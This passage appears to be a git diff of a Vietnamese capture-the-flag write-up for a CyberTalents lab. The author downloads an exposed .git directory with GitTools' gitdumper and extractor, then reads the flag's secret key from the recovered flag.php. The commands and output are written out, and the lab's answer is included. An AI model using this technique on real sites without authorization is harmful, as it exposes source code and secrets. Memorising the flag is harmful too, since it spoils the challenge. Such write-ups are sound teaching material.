@@ -85,46 +85,35 @@ Target: http://wlemxwl32epheze6eg23gmgi834kj6zq9oj9s6z9-web.cybertalentslabs.com
 3. thu được các file sau và phân tích -> file: flag.txt sai<br>
 
 ```
-ls -la            
-total 152
-drwxr-xr-x 10 root root  4096 Aug  1 04:11 .
-drwx------ 22 root root 20480 Aug  1 04:04 ..
--rw-r--r--  1 root root  4764 Jul 31 13:09 CHANGELOG.md
--rw-r--r--  1 root root  1846 Jul 31 13:09 config.ini
--rw-r--r--  1 root root  4021 Jul 31 13:09 CONTRIBUTORS.md
--rw-r--r--  1 root root     9 Jul 31 14:58 custom_wordlist.txt
-drwxr-xr-x  2 root root  4096 Jul 31 13:09 db
--rwxr-xr-x  1 root root  2504 Jul 31 13:09 dirsearch.py
--rw-r--r--  1 root root   299 Jul 31 13:09 Dockerfile
--rw-r--r--  1 root root    40 Nov  4  2020 flag.txt
-drwxr-xr-x  8 root root  4096 Jul 31 13:09 .git
-drwxr-xr-x  4 root root  4096 Jul 31 13:09 .github
--rw-r--r--  1 root root    81 Jul 31 13:09 .gitignore
--rw-------  1 root root  8895 Jul 31 15:08 index.html.tmp.tmp
--rwxr-xr-x  1 root root    85 Jul 31 13:09 __init__.py
-drwxr-xr-x 10 root root  4096 Jul 31 13:31 lib
--rw-r--r--  1 root root    68 Jul 31 13:09 options.ini
--rw-r--r--  1 root root 22635 Jul 31 13:09 README.md
-drwxr-xr-x  4 root root  4096 Aug  1 04:06 reports
--rw-r--r--  1 root root   315 Jul 31 13:09 requirements.txt
--rw-r--r--  1 root root   189 Jul 31 13:09 setup.cfg
--rwxr-xr-x  1 root root  1473 Jul 31 13:09 setup.py
-drwxr-xr-x  2 root root  4096 Jul 31 13:09 static
--rwxr-xr-x  1 root root  1563 Jul 31 13:09 testing.py
-drwxr-xr-x  7 root root  4096 Jul 31 13:09 tests
-drwxr-xr-x  4 root root  4096 Aug  1 04:11 wlemxwl32epheze6eg23gmgi834kj6zq9oj9s6z9-web.cybertalentslabs.com
+drwxr-sr-x  4 root root 4096 Aug  1 13:04 .
+drwsr-sr-x 20 root root 4096 Aug  1 05:04 ..
+drwxr-sr-x  6 root root 4096 Aug  1 05:01 .git
+drwxr-sr-x  4 root root 4096 Aug  1 13:04 wlemxwl32epheze6eg23gmgi834kj6zq9oj9s6z9-web.cybertalentslabs.com
 ```
 
-4. tìm được tệp flag.php:<br>
+4. tìm đc file flag.php và mở xem<br>
+```
+──(root㉿kali)-[/moon/wlemxwl32epheze6eg23gmgi834kj6zq9oj9s6z9-web.cybertalentslabs.com]
+└─# ls -la
+total 24
+drwxr-sr-x 4 root root 4096 Aug  1 13:04 .
+drwxr-sr-x 4 root root 4096 Aug  1 13:04 ..
+-rw-r--r-- 1 root root   89 Aug  1 13:04 flag.php
+drwxr-sr-x 7 root root 4096 Aug  1 13:04 .git
+drwxr-sr-x 2 root root 4096 Aug  1 13:04 icons
+-rw-r--r-- 1 root root  455 Aug  1 13:04 index.html
+```
 
 ```
-find . -name flag.php
-./wlemxwl32epheze6eg23gmgi834kj6zq9oj9s6z9-web.cybertalentslabs.com/flag.php
+cat flag.php                                                        
+You can't view this flag directly.
+<!-- PHP source doesn't appear on HTML comments -->
 ```
 
-5. đọc nội dung tệp -> ko xem trực tiếp đc lại tìm thấy 1 thư mục .git -> kết xuất nó:<br>
+5. tìm đc 1 file .git trong cùng thư mục với file flag.php -> dùng tool để tải lại toàn bộ thư mục .git ban đầu<br>
 ```
-./gitdumper.sh http://wlemxwl32epheze6eg23gmgi834kj6zq9oj9s6z9-web.cybertalentslabs.com/.git/ ./moon
+┌──(root㉿kali)-[~/GitTools/Dumper]
+└─# ./gitdumper.sh http://wlemxwl32epheze6eg23gmgi834kj6zq9oj9s6z9-web.cybertalentslabs.com/.git/ ./moon1
 ###########
 # GitDumper is part of https://github.com/internetwache/GitTools
 #
@@ -136,24 +125,81 @@ find . -name flag.php
 
 
 [*] Destination folder does not exist
-[+] Creating ./moon/.git/
-[-] Downloaded: HEAD
+[+] Creating ./moon1/.git/
+[+] Downloaded: HEAD
 [-] Downloaded: objects/info/packs
-[-] Downloaded: description
-[-] Downloaded: config
-[-] Downloaded: COMMIT_EDITMSG
-[-] Downloaded: index
+[+] Downloaded: description
+[+] Downloaded: config
+[+] Downloaded: COMMIT_EDITMSG
+[+] Downloaded: index
 [-] Downloaded: packed-refs
-[-] Downloaded: refs/heads/master
+[+] Downloaded: refs/heads/master
 [-] Downloaded: refs/remotes/origin/HEAD
 [-] Downloaded: refs/stash
-[-] Downloaded: logs/HEAD
-[-] Downloaded: logs/refs/heads/master
+[+] Downloaded: logs/HEAD
+[+] Downloaded: logs/refs/heads/master
 [-] Downloaded: logs/refs/remotes/origin/HEAD
 [-] Downloaded: info/refs
-[-] Downloaded: info/exclude
+[+] Downloaded: info/exclude
 [-] Downloaded: /refs/wip/index/refs/heads/master
 [-] Downloaded: /refs/wip/wtree/refs/heads/master
+[+] Downloaded: objects/ca/432659ef19b8e1cfd6607878c4eb5a778dc37d
+[-] Downloaded: objects/00/00000000000000000000000000000000000000
+[+] Downloaded: objects/08/48654ac283468f006838972da074064826f6e9
+[+] Downloaded: objects/f3/df28f6e6614d7753ba2e5c45447fde1a99671a
+[+] Downloaded: objects/c2/72c09bb7c1a565df8230f07f0e29db84fd676e
 ```
 
-6. 
+6. khôi phục lại các file ban đầu trong thư mục .git<br>
+```
+──(root㉿kali)-[~/GitTools/Extractor]
+└─# ./extractor.sh /root/GitTools/Dumper/moon1 ./moon2
+
+###########
+# Extractor is part of https://github.com/internetwache/GitTools
+#
+# Developed and maintained by @gehaxelt from @internetwache
+#
+# Use at your own risk. Usage might be illegal in certain circumstances. 
+# Only for educational purposes!
+###########
+[*] Destination folder does not exist
+[*] Creating...
+[+] Found commit: ca432659ef19b8e1cfd6607878c4eb5a778dc37d
+[+] Found file: /root/GitTools/Extractor/./moon2/0-ca432659ef19b8e1cfd6607878c4eb5a778dc37d/flag.php
+[+] Found file: /root/GitTools/Extractor/./moon2/0-ca432659ef19b8e1cfd6607878c4eb5a778dc37d/index.php
+```
+
+7. tìm kiếm file flag.php<br>
+```
+┌──(root㉿kali)-[~/GitTools/Extractor/moon2]
+└─# ls -la
+total 12
+drwxr-xr-x 3 root root 4096 Aug  1 13:41 .
+drwxr-xr-x 3 root root 4096 Aug  1 13:41 ..
+drwxr-xr-x 2 root root 4096 Aug  1 13:41 0-ca432659ef19b8e1cfd6607878c4eb5a778dc37d
+```
+
+```
+┌──(root㉿kali)-[~/GitTools/Extractor/moon2/0-ca432659ef19b8e1cfd6607878c4eb5a778dc37d]
+└─# ls -la
+total 20
+drwxr-xr-x 2 root root 4096 Aug  1 13:41 .
+drwxr-xr-x 3 root root 4096 Aug  1 13:41 ..
+-rw-r--r-- 1 root root  147 Aug  1 13:41 commit-meta.txt
+-rw-r--r-- 1 root root  160 Aug  1 13:41 flag.php
+-rw-r--r-- 1 root root  449 Aug  1 13:41 index.php
+```
+
+8. đọc thư mục flag.php: be607453caada6a05d00c0ea0057f733<br>
+```
+──(root㉿kali)-[~/GitTools/Extractor/moon2/0-ca432659ef19b8e1cfd6607878c4eb5a778dc37d]
+└─# cat flag.php                                 
+You can't view this flag directly.
+<!-- PHP source doesn't appear on HTML comments -->
+<?php
+exit();
+die();
+$secret_key = 'be607453caada6a05d00c0ea0057f733';
+?>
+```
